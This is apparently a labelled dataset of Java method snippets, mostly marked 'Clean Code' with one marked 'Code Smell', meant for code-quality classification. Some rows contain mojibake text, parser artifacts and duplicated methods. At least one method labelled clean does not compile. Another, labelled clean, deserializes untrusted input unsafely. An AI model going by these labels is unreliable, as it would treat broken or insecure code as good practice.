    builder.setNegativeButton(LocaleController.getString(""Cancel"",R.string.Cancel),null);
  }
  AlertDialog dialog=builder.show();
  if (inChat) {
    dialog.setCanceledOnTouchOutside(false);
  }
  return dialog;
}",0,Clean Code
"/** 
 * <code>optional uint32 times2 = 14;</code>
 * @param value the times2 to set
 * @return this
 */
public HandleRogueCommonPendingActionScRsp setTimes2(final int value){
  bitField0_|=0x00000004;
  times2=value;
  return this;
}",0,Clean Code
"@Override public Object read(MemoryBuffer buffer){
  long offset=this.offset;
  if (offset == -1) {
    Preconditions.checkArgument(!GraalvmSupport.isGraalBuildtime());
    offset=this.offset=Platform.UNSAFE.staticFieldOffset(field);
    base=Platform.UNSAFE.staticFieldBase(field);
  }
  return Platform.getObject(base,offset);
}",0,Clean Code
"public void setDimensions(Integer dimensions){
  this.dimensions=dimensions;
}
",0,Clean Code
"/** 
 * Returns the name of this type alias for use in user-facing messages. 
 */
public String getDisplayName(){
  return moduleName.equals(""pkl.base"") ? getSimpleName() : qualifiedName;
}
",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof StartCocoonStageScRsp)) {
    return false;
  }
  StartCocoonStageScRsp other=(StartCocoonStageScRsp)o;
  return bitField0_ == other.bitField0_ && (!hasPropEntityId() || propEntityId == other.propEntityId) && (!hasCocoonId() || cocoonId == other.cocoonId) && (!hasRetcode() || retcode == other.retcode) && (!hasWave() || wave == other.wave) && (!hasBattleInfo() || battleInfo.equals(other.battleInfo));
}",0,Clean Code
"@Override protected EmbeddingModel embeddingModel(){
  if (embeddingModel == null) {
    embeddingModel=OpenAiEmbeddingModel.builder().apiKey(System.getenv(""OPENAI_API_KEY"")).modelName(OpenAiModelName.TEXT_EMBEDDING_ADA_002).build();
  }
  return embeddingModel;
}",0,Clean Code
"@Override public GetFirstTalkByPerformanceNpcCsReq clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  npcTalkList.clear();
  return this;
}",0,Clean Code
"Property<Object> getSettingsModule();
",0,Clean Code
"private void drawCheckStatus(Canvas canvas,boolean drawClock,boolean drawCheck1,boolean drawCheck2,boolean moveCheck,float alpha){
  if (alpha == 0 && !moveCheck) {
    return;
  }
  float scale=0.5f + 0.5f * alpha;
  if (drawClock) {
    setDrawableBounds(Theme.dialogs_clockDrawable,clockDrawLeft,checkDrawTop);
    if (alpha != 1f) {
      canvas.save();
      canvas.scale(scale,scale,Theme.dialogs_clockDrawable.getBounds().centerX(),Theme.dialogs_halfCheckDrawable.getBounds().centerY());
      Theme.dialogs_clockDrawable.setAlpha((int)(255 * alpha));
    }
    Theme.dialogs_clockDrawable.draw(canvas);
    if (alpha != 1f) {
      canvas.restore();
      Theme.dialogs_clockDrawable.setAlpha(255);
    }
    invalidate();
  }
 else   if (drawCheck2) {
    if (drawCheck1) {
      setDrawableBounds(Theme.dialogs_halfCheckDrawable,halfCheckDrawLeft,checkDrawTop);
      if (moveCheck) {
        canvas.save();
        canvas.scale(scale,scale,Theme.dialogs_halfCheckDrawable.getBounds().centerX(),Theme.dialogs_halfCheckDrawable.getBounds().centerY());
        Theme.dialogs_halfCheckDrawable.setAlpha((int)(255 * alpha));
      }
      if (!moveCheck && alpha != 0) {
        canvas.save();
        canvas.scale(scale,scale,Theme.dialogs_halfCheckDrawable.getBounds().centerX(),Theme.dialogs_halfCheckDrawable.getBounds().centerY());
        Theme.dialogs_halfCheckDrawable.setAlpha((int)(255 * alpha));
        Theme.dialogs_checkReadDrawable.setAlpha((int)(255 * alpha));
      }
      Theme.dialogs_halfCheckDrawable.draw(canvas);
      if (moveCheck) {
        canvas.restore();
        canvas.save();
        canvas.translate(AndroidUtilities.dp(4) * (1f - alpha),0);
      }
      setDrawableBounds(Theme.dialogs_checkReadDrawable,checkDrawLeft,checkDrawTop);
      Theme.dialogs_checkReadDrawable.draw(canvas);
      if (moveCheck) {
        canvas.restore();
        Theme.dialogs_halfCheckDrawable.setAlpha(255);
      }
      if (!moveCheck && alpha != 0) {
        canvas.restore();
        Theme.dialogs_halfCheckDrawable.setAlpha(255);
        Theme.dialogs_checkReadDrawable.setAlpha(255);
      }
    }
 else {
      setDrawableBounds(Theme.dialogs_checkDrawable,checkDrawLeft1,checkDrawTop);
      if (alpha != 1f) {
        canvas.save();
        canvas.scale(scale,scale,Theme.dialogs_checkDrawable.getBounds().centerX(),Theme.dialogs_halfCheckDrawable.getBounds().centerY());
        Theme.dialogs_checkDrawable.setAlpha((int)(255 * alpha));
      }
      Theme.dialogs_checkDrawable.draw(canvas);
      if (alpha != 1f) {
        canvas.restore();
        Theme.dialogs_checkDrawable.setAlpha(255);
      }
    }
  }
}",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=(1 * archiveMissingAvatarIdList.length()) + ProtoSink.computeRepeatedUInt32SizeNoTag(archiveMissingAvatarIdList);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=(1 * archiveEquipmentIdList.length()) + ProtoSink.computeRepeatedUInt32SizeNoTag(archiveEquipmentIdList);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=(1 * archiveMissingEquipmentIdList.length()) + ProtoSink.computeRepeatedUInt32SizeNoTag(archiveMissingEquipmentIdList);
  }
  if ((bitField0_ & 0x00000008) != 0) {
    size+=(1 * archiveMonsterIdList.length()) + ProtoSink.computeRepeatedMessageSizeNoTag(archiveMonsterIdList);
  }
  if ((bitField0_ & 0x00000010) != 0) {
    size+=(1 * relicList.length()) + ProtoSink.computeRepeatedMessageSizeNoTag(relicList);
  }
  return size;
}",0,Clean Code
"public static AiMessage aiMessageFrom(ChatCompletionResponse response){
  AssistantMessage message=response.getChoices().get(0).getMessage();
  if (isNullOrEmpty(message.getToolCalls())) {
    return AiMessage.from(message.getContent());
  }
  return AiMessage.from(specificationsFrom(message.getToolCalls()));
}",0,Clean Code
"public String getScheme(){
  return scheme;
}
",0,Clean Code
"@Override public void visitBoolean(Boolean value){
  visitPropertyValue(value);
}
",0,Clean Code
"@Override public EnterMapRotationRegionScRsp mergeFrom(final EnterMapRotationRegionScRsp other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasRetcode()) {
    setRetcode(other.retcode);
  }
  if (other.hasClientPosVersion()) {
    setClientPosVersion(other.clientPosVersion);
  }
  if (other.hasMotion()) {
    getMutableMotion().mergeFrom(other.motion);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@2d7b4ee1!org.eclipse.jdt.core.dom.MethodDeclaration@25be194",0,Clean Code
"public static void addBooleanValueBoxed(FlatBufferBuilder builder,boolean booleanValueBoxed){
  builder.addBoolean(13,booleanValueBoxed,false);
}",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(storyBuffTwo);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(storyBuffOne);
  }
  return size;
}",0,Clean Code
"private void endObject(VmObjectLike value,boolean isEmpty){
  if (isDocument && value == topLevelValue)   return;
  decreaseIndent();
  if (!isEmpty) {
    builder.append('\n');
    builder.append(currIndent);
  }
  builder.append('}');
}
",0,Clean Code
"@Override public boolean equals(Object o){
  if (this == o)   return true;
  if (!(o instanceof SpeechResponse))   return false;
  return Objects.equals(speech,that.speech) && Objects.equals(speechResponseMetadata,that.speechResponseMetadata);
}
",0,Clean Code
"@Test public void testSet(){
  jedisCluster.set(""key"",""value"");
  jedisCluster.set(""key"",""value"",SetParams.setParams());
}
",0,Clean Code
"private PortCandidate getCandidateWithDirection(final Collection<PortCandidate> candidates,final byte direction){
  if (candidates == null) {
    return null;
  }
  for (  final PortCandidate cand : candidates) {
    if (cand.getDirection() == direction) {
      return cand;
    }
  }
  return null;
}
",0,Clean Code
"/** 
 * <code>repeated uint32 owned_chat_bubbles = 6;</code>
 * @param values the ownedChatBubbles to add
 * @return this
 */
public GetPhoneDataScRsp addAllOwnedChatBubbles(final int... values){
  bitField0_|=0x00000008;
  ownedChatBubbles.addAll(values);
  return this;
}",0,Clean Code
"public Builder clearOneof(com.google.protobuf.Descriptors.OneofDescriptor oneof){
  return (Builder)super.clearOneof(oneof);
}
public Builder clearOneof(com.google.protobuf.Descriptors.OneofDescriptor oneof){
  return (Builder)super.clearOneof(oneof);
}
",0,Clean Code
"private void processTouchEvent(MotionEvent e){
}
",0,Clean Code
"@Override protected void initUndoHistory(){
  final int x=getCaretEndPosX();
  final int y=getCaretMouseReleasedY();
  final ZyLineContent lineContent=getLineContent(y);
  IZyEditableObject editableObject=lineContent.getLineFragmentObjectAt(x);
  m_isAboveComment=isAboveLineComment(y);
  m_isBehindComment=isBehindLineComment(x,y);
  m_isLabelComment=isLabelComment(y);
  boolean isNewBehindLineComment=false;
  if ((x == lineContent.getText().length()) && !isComment(x,y)) {
    m_isBehindComment=true;
    isNewBehindLineComment=true;
    editableObject=lineContent.getLineObject();
  }
  m_editableObject=editableObject;
  String text="""";
  if (editableObject != null) {
    if (!isNewBehindLineComment) {
      text=lineContent.getText().substring(editableObject.getStart(),editableObject.getEnd());
      if (isComment(x,y)) {
        text=getMultiLineComment(y);
      }
    }
    udpateUndolist(getLabelContent(),lineContent.getLineObject().getPersistentModel(),editableObject,text,m_isAboveComment,m_isBehindComment,m_isLabelComment,getCaretStartPosX(),getCaretMousePressedX(),getCaretMousePressedY(),getCaretEndPosX(),getCaretMouseReleasedX(),getCaretMouseReleasedY());
  }
}
",0,Clean Code
"private Task testTask(String taskDefName){
  Task task=new Task();
  task.setTaskId(UUID.randomUUID().toString());
  task.setStatus(Task.Status.IN_PROGRESS);
  task.setTaskDefName(taskDefName);
  return task;
}
",0,Clean Code
"/** 
 * <code>optional uint32 avatar_id = 5;</code>
 * @return whether the avatarId field is set
 */
public boolean hasAvatarId(){
  return (bitField0_ & 0x00000001) != 0;
}",0,Clean Code
"/** 
 * <code>optional uint32 progress = 8;</code>
 * @return the progress
 */
public int getProgress(){
  return progress;
}",0,Clean Code
"@Override public ChessRogueNousStoryInfo create(){
  return ChessRogueNousStoryInfo.newInstance();
}
",0,Clean Code
"/** 
 * Build mapping from record component to read field. 
 */
public static int[] buildRecordComponentMapping(Class<?> cls,List<String> fields){
  Map<String,Integer> fieldOrderIndex=new HashMap<>(fields.size());
  int counter=0;
  for (  String fieldName : fields) {
    fieldOrderIndex.put(fieldName,counter++);
  }
  RecordComponent[] components=getRecordComponents(cls);
  if (components == null) {
    return null;
  }
  int[] mapping=new int[components.length];
  for (int i=0; i < mapping.length; i++) {
    RecordComponent component=components[i];
    Integer index=fieldOrderIndex.get(component.getName());
    if (index == null) {
      mapping[i]=-1;
    }
 else {
      mapping[i]=index;
    }
  }
  return mapping;
}",0,Clean Code
"public Integer getMaxGenLen(){
  return this.maxGenLen;
}
",0,Clean Code
"/** 
 * <code>optional uint32 cur_map_entry_id = 10;</code>
 * @return this
 */
public GetSceneMapInfoScRsp clearCurMapEntryId(){
  bitField0_&=~0x00000004;
  curMapEntryId=0;
  return this;
}",0,Clean Code
"/** 
 * <code>optional .ExtraLineupType extra_lineup_type = 8;</code>
 * @param value the extraLineupType to set
 * @return this
 */
public QuitLineupCsReq setExtraLineupType(final ExtraLineupTypeOuterClass.ExtraLineupType value){
  bitField0_|=0x00000008;
  extraLineupType=value.getNumber();
  return this;
}",0,Clean Code
"public void reset(){
  if (objects.size() > 0) {
    objects.clear();
  }
  metaContext=null;
}",0,Clean Code
"@Override @Transactional public Result<Void> batchModifyInDB(List<ConnectClusterDTO> dtoList,String operator){
  LOGGER.info(""method=batchModifyInDB||data={}||operator={}"",dtoList,operator);
  for (  ConnectClusterDTO dto : dtoList) {
    if (!dto.getClusterUrl().startsWith(""http://"") && !dto.getClusterUrl().startsWith(""https://"")) {
      return Result.buildFromRSAndMsg(ResultStatus.PARAM_ILLEGAL,""clusterUrl蹇呴』浠ttp鎴栬卙ttps寮澶"");
    }
  }
  for (  ConnectClusterDTO dto : dtoList) {
    try {
      ConnectClusterPO po=this.getRowById(dto.getId());
      if (po == null) {
        TransactionAspectSupport.currentTransactionStatus().setRollbackOnly();
        return Result.buildFromRSAndMsg(ResultStatus.NOT_EXIST,MsgConstant.getConnectClusterNotExist(dto.getId()));
      }
      if (!ValidateUtils.isNull(dto.getName())) {
        po.setName(dto.getName());
      }
      if (!ValidateUtils.isNull(dto.getClusterUrl())) {
        String clusterUrl=dto.getClusterUrl();
        if (clusterUrl.charAt(clusterUrl.length() - 1) == '/') {
          clusterUrl=clusterUrl.substring(0,clusterUrl.length() - 1);
        }
        po.setClusterUrl(clusterUrl);
      }
      if (!ValidateUtils.isNull(dto.getVersion())) {
        po.setVersion(dto.getVersion());
      }
      if (!ValidateUtils.isNull(dto.getJmxProperties())) {
        po.setJmxProperties(dto.getJmxProperties());
      }
      connectClusterDAO.updateById(po);
      opLogWrapService.saveOplogAndIgnoreException(new OplogDTO(operator,OperationEnum.EDIT.getDesc(),ModuleEnum.KAFKA_CONNECT_CLUSTER.getDesc(),MsgConstant.getConnectClusterBizStr(dto.getId(),dto.getName()),ConvertUtil.obj2Json(po)));
    }
 catch (    DuplicateKeyException dke) {
      LOGGER.error(""method=batchModifyInDB||data={}||operator={}||errMsg=connectCluster name duplicate"",dtoList,operator);
      TransactionAspectSupport.currentTransactionStatus().setRollbackOnly();
      return Result.buildFromRSAndMsg(ResultStatus.PARAM_ILLEGAL,""connect闆嗙兢name閲嶅"");
    }
catch (    Exception e) {
      LOGGER.error(""method=batchModifyInDB||data={}||operator={}||errMsg=exception"",dtoList,operator,e);
      TransactionAspectSupport.currentTransactionStatus().setRollbackOnly();
      return Result.buildFromRSAndMsg(ResultStatus.MYSQL_OPERATE_FAILED,e.getMessage());
    }
  }
  return Result.buildSuc();
}",1,Code Smell
"/** 
 * <code>optional uint32 unlock_id = 13;</code>
 * @return the unlockId
 */
public int getUnlockId(){
  return unlockId;
}",0,Clean Code
"@Override public JPopupMenu getPopupMenu(){
  return null;
}
",0,Clean Code
"/** 
 * <pre> RogueRoomStatus EPLFPIFPEEM = 8; </pre> <code>optional .RogueRoomStatus room_status = 8;</code>
 * @return the roomStatus
 */
public RogueRoomStatusOuterClass.RogueRoomStatus getRoomStatus(){
  return RogueRoomStatusOuterClass.RogueRoomStatus.forNumber(roomStatus);
}",0,Clean Code
"/** 
 * <code>repeated .SceneGroupState group_state_list = 1768;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public RepeatedMessage<SceneGroupStateOuterClass.SceneGroupState> getMutableGroupStateList(){
  bitField0_|=0x00001000;
  return groupStateList;
}",0,Clean Code
"@Specialization protected boolean eval(boolean operand){
  return !operand;
}
",0,Clean Code
"/** 
 * <code>repeated uint32 finished_main_mission_id_list = 6;</code>
 * @param value the finishedMainMissionIdList to add
 * @return this
 */
public GetMissionStatusScRsp addFinishedMainMissionIdList(final int value){
  bitField0_|=0x00000002;
  finishedMainMissionIdList.add(value);
  return this;
}",0,Clean Code
"/** 
 * @param taskType Task to retrieve
 * @return Task Definition
 */
public TaskDef getTaskDef(String taskType){
  TaskDef taskDef=metadataDAO.getTaskDef(taskType);
  if (taskDef == null) {
    throw new NotFoundException(""No such taskType found by name: %s"",taskType);
  }
  return taskDef;
}
",0,Clean Code
"/** 
 * getNodeValue
 * @param childNodes
 * @param root
 * @return
 */
private String getNodeValue(List<PbNode> childNodes,DynamicMessage root){
  String fieldValue="""";
  DynamicMessage current=root;
  for (int i=0; i < childNodes.size(); i++) {
    PbNode node=childNodes.get(i);
    Object nodeValue=current.getField(node.getFieldDesc());
    if (nodeValue == null) {
      break;
    }
    if (node.isLastNode()) {
switch (node.getFieldDesc().getJavaType()) {
case STRING:
case INT:
case LONG:
case FLOAT:
case DOUBLE:
case BOOLEAN:
        fieldValue=String.valueOf(nodeValue);
      break;
case BYTE_STRING:
    ByteString byteString=(ByteString)nodeValue;
  fieldValue=new String(byteString.toByteArray(),srcCharset);
break;
case ENUM:
fieldValue=String.valueOf(nodeValue);
break;
case MESSAGE:
fieldValue=String.valueOf(nodeValue);
break;
}
break;
}
if (!node.isArray()) {
if (!(nodeValue instanceof DynamicMessage)) {
break;
}
current=(DynamicMessage)nodeValue;
}
 else {
if (!(nodeValue instanceof List)) {
break;
}
List<?> nodeList=(List<?>)nodeValue;
if (node.getArrayIndex() >= nodeList.size()) {
break;
}
Object nodeElement=nodeList.get(node.getArrayIndex());
if (!(nodeElement instanceof DynamicMessage)) {
break;
}
current=(DynamicMessage)nodeElement;
}
}
return fieldValue;
}",0,Clean Code
"/** 
 * @return the name
 */
public String getName(){
  return name;
}
",0,Clean Code
"public GroupArtifactVersion getValues(GroupArtifactVersion gav){
  return gav.withGroupId(getValue(gav.getGroupId())).withArtifactId(getValue(gav.getArtifactId())).withVersion(getValue(gav.getVersion()));
}
public GroupArtifact getValues(GroupArtifact ga){
  return ga.withGroupId(getValue(ga.getGroupId())).withArtifactId(getValue(ga.getArtifactId()));
}
private Dependency getValues(Dependency dep,int depth){
  Dependency d=dep.withGav(getValues(dep.getGav())).withScope(getValue(dep.getScope()));
  if (d.getGroupId() == null) {
    return d;
  }
  String scope;
  if (d.getScope() == null) {
    Scope parsedScope=getManagedScope(d.getGroupId(),d.getArtifactId(),d.getType(),d.getClassifier());
    scope=parsedScope == null ? null : parsedScope.toString().toLowerCase();
  }
 else {
    scope=getValue(d.getScope());
  }
  List<GroupArtifact> managedExclusions=getManagedExclusions(d.getGroupId(),d.getArtifactId(),d.getType(),d.getClassifier());
  if (!managedExclusions.isEmpty()) {
    d=d.withExclusions(ListUtils.concatAll(d.getExclusions(),managedExclusions));
  }
  if (d.getClassifier() != null) {
    d=d.withClassifier(getValue(d.getClassifier()));
  }
  if (d.getType() != null) {
    d=d.withType(getValue(d.getType()));
  }
  String version=d.getVersion();
  if (d.getVersion() == null || depth > 0) {
    version=getManagedVersion(d.getGroupId(),d.getArtifactId(),d.getType(),d.getClassifier());
    if (version == null) {
      version=d.getVersion();
    }
  }
  return d.withGav(d.getGav().withVersion(version)).withScope(scope);
}",0,Clean Code
"public void setScore(int score){
  this.score=score;
}
",0,Clean Code
"/** 
 * <code>repeated .SceneBattleInfo.BattleTargetInfoEntry battle_target_info = 1433;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public RepeatedMessage<BattleTargetInfoEntry> getMutableBattleTargetInfo(){
  bitField0_|=0x00000200;
  return battleTargetInfo;
}",0,Clean Code
"private LibSVMAnomalyModelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private LibSVMAnomalyModelProto(){
}
!org.eclipse.jdt.core.dom.MethodDeclaration@393aac93",0,Clean Code
"/** 
 * isValidIp
 * @param ip
 * @return
 */
public static boolean isValidIp(String ip){
  if (ip == null || ip.trim().isEmpty()) {
    return false;
  }
  if (ip.equals(""localhost"")) {
    ip=""127.0.0.1"";
  }
  boolean b=false;
  ip=ip.trim();
  if (ip.matches(""\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}"")) {
    String[] s=ip.split(""\\."");
    int number0=Integer.parseInt(s[0]);
    int number1=Integer.parseInt(s[1]);
    int number2=Integer.parseInt(s[2]);
    int number3=Integer.parseInt(s[3]);
    if (number0 >= 0 && number0 <= 255) {
      if (number1 >= 0 && number1 <= 255) {
        if (number2 >= 0 && number2 <= 255) {
          if (number3 >= 0 && number3 <= 255) {
            b=true;
          }
        }
      }
    }
  }
  return b;
}",0,Clean Code
"/** 
 * Query based on code
 * @param code
 * @return
 */
DataResult<Config> find(@NotNull String code);
",0,Clean Code
"private void editActionIntSharedPrefs(int value){
  PrefsUtils.mSharedPreferences.edit().putInt(mActionKey,value).apply();
}
",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(ceilingNum);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=2;
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=(1 * avatarList.length()) + ProtoSink.computeRepeatedMessageSizeNoTag(avatarList);
  }
  return size;
}",0,Clean Code
"public void setDiscussToGroupTime(int i2){
  this.discussToGroupTime=i2;
}",0,Clean Code
"/** 
 * @hide 
 */
@Override public boolean performAccessibilityAction(int action,Bundle arguments){
  if (super.performAccessibilityAction(action,arguments)) {
    return true;
  }
  if (!isEnabled()) {
    return false;
  }
switch (action) {
case AccessibilityNodeInfo.ACTION_SCROLL_FORWARD:
case android.R.id.accessibilityActionScrollDown:
{
      final int viewportHeight=getHeight() - getPaddingBottom() - getPaddingTop();
      final int targetScrollY=Math.min(getScrollY() + viewportHeight,getScrollRange());
      if (targetScrollY != getScrollY()) {
        smoothScrollTo(0,targetScrollY);
        return true;
      }
    }
  return false;
case AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD:
case android.R.id.accessibilityActionScrollUp:
{
  final int viewportHeight=getHeight() - getPaddingBottom() - getPaddingTop();
  final int targetScrollY=Math.max(getScrollY() - viewportHeight,0);
  if (targetScrollY != getScrollY()) {
    smoothScrollTo(0,targetScrollY);
    return true;
  }
}
return false;
}
return false;
}",0,Clean Code
"public EvaluatorBuilder unsetSecurityManager(){
  this.securityManager=null;
  return this;
}
",0,Clean Code
"protected abstract void createChildren();
",0,Clean Code
"/** 
 * 鏌ヨ鍥炴敹绔欐墍鏈夊唴瀹�
 * @param userId 鐢ㄦ埛ID
 */
public List<ArticleRecycleEntity> listAll(Long userId){
  return baseMapper.listAll(userId);
}
",0,Clean Code
"@NonNull private static Configuration createOverrideConfiguration(@NonNull Context context,@NonNull AppearanceOptions options){
  return createOverrideConfiguration(context,options,null,false);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@3d591d9c",0,Clean Code
"@Override public void clear(){
  delegate.clear();
}
@Override public void clear(){
  delegate.clear();
}
",0,Clean Code
"public int getIsOpenTab(){
  return this.isOpenTab;
}
",0,Clean Code
"public Duration getTimeout(){
  return timeout;
}
",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=2 + ProtoSink.computeMessageSizeNoTag(rogueInfoData);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=2 + ProtoSink.computeMessageSizeNoTag(rogueCurrentInfo);
  }
  return size;
}",0,Clean Code
"ArrayList<Long> getBlockUserList();
",0,Clean Code
"/** 
 * 鐗堟湰鍙峰綊涓�鍖� 鍏堣�冭檻鏍囧噯鐨刱afka鐗堟湰鍙凤紝0.7.x\0.10.0.x\1.0.x\2.2.x.x
 * @param version
 * @return
 */
public static long normailze(String version){
  if (StringUtils.isBlank(version)) {
    return -1;
  }
  if (version.contains(XIAO_JU_VERSION_FEATURE)) {
    return normalizeXiaoJuVersion(version);
  }
  String[] vers=version.split(""\\."");
  if (vers.length < MIN_VERSION_SECTIONS_3) {
    return -1;
  }
  for (  String ver : vers) {
    if (!ver.chars().allMatch(Character::isDigit)) {
      return -1;
    }
  }
  long val=-1;
  if (MIN_VERSION_SECTIONS_3 == vers.length) {
    val=Long.parseLong(vers[0]) * APACHE_STEP_VAL * APACHE_STEP_VAL* APACHE_STEP_VAL + Long.parseLong(vers[1]) * APACHE_STEP_VAL * APACHE_STEP_VAL + Long.parseLong(vers[2]) * APACHE_STEP_VAL;
  }
 else   if (MIN_VERSION_SECTIONS_4 == vers.length) {
    val=Long.parseLong(vers[0]) * APACHE_STEP_VAL * APACHE_STEP_VAL* APACHE_STEP_VAL + Long.parseLong(vers[1]) * APACHE_STEP_VAL * APACHE_STEP_VAL + Long.parseLong(vers[2]) * APACHE_STEP_VAL + Long.parseLong(vers[3]);
  }
  return val == -1 ? val : val * BASE_VAL;
}",0,Clean Code
"/** 
 * <code>optional .ItemCostList revive_cost = 6;</code>
 * @param value the reviveCost to set
 * @return this
 */
public RogueAvatarReviveCost setReviveCost(final ItemCostListOuterClass.ItemCostList value){
  bitField0_|=0x00000001;
  reviveCost.copyFrom(value);
  return this;
}",0,Clean Code
"/** 
 * <code>repeated .BattleTarget battle_target_list = 1;</code>
 * @return this
 */
public BattleTargetList clearBattleTargetList(){
  bitField0_&=~0x00000001;
  battleTargetList.clear();
  return this;
}",0,Clean Code
"/** 
 * Sets the topP parameter for sampling tokens from the top percentile of probability mass.
 * @param topP The topP parameter.
 */
public void setTopP(Float topP){
  this.topP=topP;
}
",0,Clean Code
"@Test public void testWorkflowTaskTypeDecision(){
  WorkflowTask workflowTask=createSampleWorkflowTask();
  workflowTask.setType(""DECISION"");
  when(mockMetadataDao.getTaskDef(anyString())).thenReturn(new TaskDef());
  Set<ConstraintViolation<WorkflowTask>> result=validator.validate(workflowTask);
  assertEquals(2,result.size());
  List<String> validationErrors=new ArrayList<>();
  result.forEach(e -> validationErrors.add(e.getMessage()));
  assertTrue(validationErrors.contains(""decisionCases should have atleast one task for taskType: DECISION taskName: encode""));
  assertTrue(validationErrors.contains(""caseValueParam or caseExpression field is required for taskType: DECISION taskName: encode""));
}",0,Clean Code
"public static DatabaseInterface getByDbType(String dbType){
  if (JdbcConstants.MYSQL.equals(dbType)) {
    return MySQLDatabaseMeta.getInstance();
  }
 else   if (JdbcConstants.ORACLE.equals(dbType)) {
    return OracleDatabaseMeta.getInstance();
  }
 else   if (JdbcConstants.POSTGRESQL.equals(dbType)) {
    return PostgresqlDatabaseMeta.getInstance();
  }
 else   if (JdbcConstants.SQL_SERVER.equals(dbType)) {
    return SqlServerDatabaseMeta.getInstance();
  }
 else   if (JdbcConstants.HIVE.equals(dbType)) {
    return HiveDatabaseMeta.getInstance();
  }
 else   if (JdbcConstants.CLICKHOUSE.equals(dbType)) {
    return ClickHouseDataBaseMeta.getInstance();
  }
 else   if (JdbcConstants.HBASE20XSQL.equals(dbType)) {
    return Hbase20xsqlMeta.getInstance();
  }
 else   if (JdbcConstants.HANA.equals(dbType)) {
    return HanaDatabaseMeta.getInstance();
  }
 else {
    throw new UnsupportedOperationException(""鏆備笉鏀寔鐨勭被鍨嬶細"".concat(dbType));
  }
}",0,Clean Code
"public void save(){
  if (this.uid <= 0) {
    LunarCore.getLogger().error(""Tried to save a player object without a uid!"");
    return;
  }
  LunarCore.getGameDatabase().save(this);
}",0,Clean Code
"protected FieldAccessorTable internalGetFieldAccessorTable(){
  return FieldDataSnapshotBuf.internal_static_FieldDataSnapshot_Data_fieldAccessorTable.ensureFieldAccessorsInitialized(Data.class,Builder.class);
}
protected FieldAccessorTable internalGetFieldAccessorTable(){
  return FieldDataSnapshotBuf.internal_static_FieldDataSnapshot_Data_fieldAccessorTable.ensureFieldAccessorsInitialized(Data.class,Builder.class);
}
",0,Clean Code
"public Error(String message,PklException exception){
  this.message=message;
  this.exception=exception;
}
",0,Clean Code
"public long getRoomId(){
  return this.roomId;
}
",0,Clean Code
"@SuppressWarnings(""UnusedReturnValue"") public static boolean importPath(SharedPreferences sharedPreferences,final @NonNull InputStream inputStream) throws IOException {
  ObjectInputStream objectInputStream=null;
  Map<String,Object> map;
  try {
    objectInputStream=new ObjectInputStream(inputStream);
    map=(Map<String,Object>)objectInputStream.readObject();
  }
 catch (  Exception e) {
    Log.e(TAG,""Error deserializing preferences"",BuildConfig.DEBUG ? e : null);
    return false;
  }
 finally {
    objectInputStream.close();
    inputStream.close();
  }
  SharedPreferences.Editor editor=sharedPreferences.edit();
  editor.clear();
  for (  Map.Entry<String,Object> e : map.entrySet()) {
    if (e.getValue() instanceof Boolean) {
      editor.putBoolean(e.getKey(),(Boolean)e.getValue());
    }
 else     if (e.getValue() instanceof String) {
      editor.putString(e.getKey(),(String)e.getValue());
    }
 else     if (e.getValue() instanceof Integer) {
      editor.putInt(e.getKey(),(int)e.getValue());
    }
 else     if (e.getValue() instanceof Float) {
      editor.putFloat(e.getKey(),(float)e.getValue());
    }
 else     if (e.getValue() instanceof Long) {
      editor.putLong(e.getKey(),(Long)e.getValue());
    }
 else     if (e.getValue() instanceof Set) {
      editor.putStringSet(e.getKey(),(Set<String>)e.getValue());
    }
 else {
      throw new IllegalArgumentException(""Type "" + e.getValue().getClass().getName() + "" is unknown"");
    }
  }
  return editor.commit();
}
",0,Clean Code
"@Test void should_not_evict_system_message_from_chat_memory(){
  ChatMemory chatMemory=MessageWindowChatMemory.withMaxMessages(3);
  SystemMessage systemMessage=systemMessage(""You are a helpful assistant"");
  chatMemory.add(systemMessage);
  UserMessage firstUserMessage=userMessage(""Hello"");
  chatMemory.add(firstUserMessage);
  AiMessage firstAiMessage=aiMessage(""Hi, how can I help you?"");
  chatMemory.add(firstAiMessage);
  assertThat(chatMemory.messages()).containsExactly(systemMessage,firstUserMessage,firstAiMessage);
  UserMessage secondUserMessage=userMessage(""Tell me a joke"");
  chatMemory.add(secondUserMessage);
  assertThat(chatMemory.messages()).containsExactly(systemMessage,firstAiMessage,secondUserMessage);
  AiMessage secondAiMessage=aiMessage(""Why did the Java developer wear glasses? Because they didn't see sharp!"");
  chatMemory.add(secondAiMessage);
  assertThat(chatMemory.messages()).containsExactly(systemMessage,secondUserMessage,secondAiMessage);
}",0,Clean Code
"/** 
 * <code>optional bool handle_result = 3;</code>
 * @return this
 */
public HandleFriendCsReq clearHandleResult(){
  bitField0_&=~0x00000002;
  handleResult=false;
  return this;
}",0,Clean Code
"private void drawReplyButton(Canvas canvas){
}
",0,Clean Code
